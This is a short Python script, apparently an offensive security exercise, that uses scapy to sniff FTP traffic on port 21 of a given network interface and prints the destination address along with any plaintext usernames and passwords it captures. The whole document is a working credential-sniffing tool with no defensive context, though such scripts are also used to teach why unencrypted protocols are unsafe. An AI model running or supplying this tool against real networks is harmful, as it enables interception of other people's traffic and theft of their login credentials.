# Only works in Linux unless install winpcap for windows

import argparse as argp #Import argparse as argp for arguement parsing
from termcolor import colored as clrd #Import color text to the output, not neccessary but helps easily seeing the data
from scapy.all import *

def ftpSniff(pkt):
    dest = pkt.getlayer(scapy.IP).dst
    raw = pkt.sprintf("%Raw.load%")
    usr = re.findall("(?i)USER (.*)", raw)
    pswd = re.findall("(?i)PASS (.*)", raw)
    if usr:
        print (clrd(f"[*] Detected FTP Login To {str(dest)}", 'white'))
        print (clrd(f"[+] User Account: {str(usr[0])}", 'white'))
    elif pswd:
        print (clrd(f"[+] Password: {str(pswd[0])}", 'white'))

def main():
    parser = argp.ArgumentParser(description="Usage of program: " + "-i <interface>")
    parser.add_argument("-i", "--interface", dest="interface", metavar="", required=True, help="Specify Interface to Listen From.")
    options = parser.parse_args()

    if (options.interface == None):
        print(clrd(parser.usage, 'cyan'))
        exit(0)
    else:
        conf.iface = options.interface

    try:
        sniff(filter = "tcp port 21", prn = ftpSniff)
    except KeyboardInterrupt:
        exit(0)

if __name__ == "__main__":
    main()
